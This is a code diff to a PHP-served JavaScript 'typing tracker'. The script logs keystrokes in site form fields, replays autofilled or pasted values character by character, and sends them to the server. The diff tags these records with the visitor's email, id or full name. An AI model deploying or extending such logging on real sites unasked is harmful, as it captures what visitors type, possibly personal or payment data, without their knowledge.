@@ -6,12 +6,14 @@ if (session_status() === PHP_SESSION_NONE) {
 }
 
 $userId = '';
-if (!empty($_SESSION['username'])) {
-    $userId = $_SESSION['username'];
+if (!empty($_SESSION['user_email'])) {
+    $userId = $_SESSION['user_email'];
 } elseif (!empty($_SESSION['user_id'])) {
     $userId = $_SESSION['user_id'];
+} elseif (!empty($_SESSION['username'])) {
+    $userId = $_SESSION['username'];
 } elseif (!empty($_SESSION['user'])) {
-    $userId = is_array($_SESSION['user']) ? ($_SESSION['user']['name'] ?? $_SESSION['user']['username'] ?? $_SESSION['user']['id'] ?? '') : $_SESSION['user'];
+    $userId = is_array($_SESSION['user']) ? ($_SESSION['user']['email'] ?? $_SESSION['user']['username'] ?? $_SESSION['user']['id'] ?? '') : $_SESSION['user'];
 } elseif (!empty($_COOKIE['tracker_user_id'])) {
     $userId = $_COOKIE['tracker_user_id'];
 }
@@ -33,14 +35,31 @@ if ($isDirectJsRequest) {
 
     // Detect or generate unique persistent client identifier
     function getUserId() {
+        // 1. Check PHP session user ID
         var phpUserId = <?php echo json_encode((string)$userId); ?>;
         if (phpUserId && phpUserId.trim() !== '') {
             return phpUserId.trim();
         }
+
+        // 2. Check window.currentUser object set by frontend/header
+        if (window.currentUser) {
+            if (window.currentUser.email && String(window.currentUser.email).trim() !== '') {
+                return String(window.currentUser.email).trim();
+            }
+            if (window.currentUser.id && String(window.currentUser.id).trim() !== '') {
+                return String(window.currentUser.id).trim();
+            }
+            if (window.currentUser.fullName && String(window.currentUser.fullName).trim() !== '') {
+                return String(window.currentUser.fullName).trim();
+            }
+        }
+
+        // 3. Check explicit custom global variable
         if (window.TYPING_TRACKER_USER_ID && String(window.TYPING_TRACKER_USER_ID).trim() !== '') {
             return String(window.TYPING_TRACKER_USER_ID).trim();
         }
 
+        // 4. Fallback to unique persistent local storage/cookie UUID for guests
         var storageKey = 'typing_tracker_uid';
         var storedId = null;
         try {
@@ -121,6 +140,13 @@ if ($isDirectJsRequest) {
         return (window.location.host || '') + (window.location.pathname || '');
     }
 
+    function currentUserId() {
+        // Dynamic re-eval in case window.currentUser loaded after tracker script
+        var latestId = getUserId();
+        if (latestId) userId = latestId;
+        return userId;
+    }
+
     // Fast keypress recorder
     function recordKey(e) {
         try {
@@ -140,11 +166,10 @@ if ($isDirectJsRequest) {
                 keyChar = String.fromCharCode(e.keyCode || e.which || 0);
             }
 
-            // Flag that keypress typed into target recently
             target.__ttLastKeyTime = Date.now();
 
             keyBuffer.push({
-                user_id: userId,
+                user_id: currentUserId(),
                 page_url: getCleanPageUrl(),
                 field_id: fieldInfo.id,
                 field_name: fieldInfo.name,
@@ -172,11 +197,9 @@ if ($isDirectJsRequest) {
             if (target.type === 'password') return;
 
             var isAutofill = false;
-            // Check inputType for autofill or missing recent keypresses
             if (e.inputType === 'insertReplacementText' || e.inputType === 'insertFromPaste') {
                 isAutofill = true;
             } else if (!target.__ttLastKeyTime || (Date.now() - target.__ttLastKeyTime > 300)) {
-                // If value exists and no keypress occurred in last 300ms, it was autofilled/pasted
                 if (target.value && target.value.length > 0) {
                     isAutofill = true;
                 }
@@ -191,11 +214,10 @@ if ($isDirectJsRequest) {
                     target.__ttLastAutofillValue = val;
                     var baseTime = (typeof performance !== 'undefined' && performance.now) ? (performance.timing ? performance.timing.navigationStart + performance.now() : Date.now()) : Date.now();
 
-                    // Record each character of the autofill string sequentially
                     for (var i = 0; i < val.length; i++) {
                         sequenceCounter++;
                         keyBuffer.push({
-                            user_id: userId,
+                            user_id: currentUserId(),
                             page_url: getCleanPageUrl(),
                             field_id: fieldInfo.id,
                             field_name: fieldInfo.name,
@@ -222,7 +244,7 @@ if ($isDirectJsRequest) {
 
         var payload = JSON.stringify({
             action: 'save_keys',
-            user_id: userId,
+            user_id: currentUserId(),
             page_url: getCleanPageUrl(),
             keys: keysToSend
         });
